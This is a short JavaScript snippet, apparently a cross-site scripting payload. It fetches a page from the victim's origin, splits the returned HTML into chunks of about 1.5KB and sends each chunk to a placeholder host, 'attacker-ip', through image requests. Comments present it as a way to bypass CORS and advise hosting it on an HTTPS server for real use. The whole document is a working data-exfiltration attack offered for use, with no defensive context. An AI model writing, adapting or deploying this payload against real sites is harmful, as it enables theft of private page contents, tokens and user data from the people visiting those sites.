// this can help bypassing CORS (make sure to host this script on https server in the real world)

let html = "";

fetch("/path/to/page/u-want-to-extract/")
  .then(res => res.text())
  .then(data => {
    html = data;

    // Chunk and exfil using image requests
    const chunks = html.match(/.{1,1500}/gs); // ~1.5KB safe chunk size
    chunks.forEach((chunk, i) => {
      new Image().src = `https://attacker-ip/?part=${i}&data=` + encodeURIComponent(chunk);
    });
  });

// this will extract the page in url encoded chunks (GET safe)
